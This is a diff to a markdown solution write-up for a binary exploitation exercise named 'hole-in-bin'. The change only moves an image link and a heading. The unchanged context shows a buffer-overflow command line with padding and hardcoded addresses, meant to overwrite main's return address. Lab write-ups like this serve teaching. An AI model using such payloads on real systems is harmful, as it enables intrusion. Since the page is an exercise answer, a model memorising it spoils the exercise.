@@ -156,7 +156,8 @@ This will eventually overwrite the return address of main().
 I used same principles here to get information as in the previous task.
 #### Solution:
 `./bin $(python -c "print 'A'*20 + '\x74\x97\x04\x08'") $(python -c "print '\x94\x84\x04\x08'")`
-<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/11_done.png">   
-##
 
+<img src="https://01.kood.tech/git/juss/hole-in-bin/raw/branch/master/images/11_done.png">   
+
+##
 ### Author: [Juss](https://01.kood.tech/git/juss)
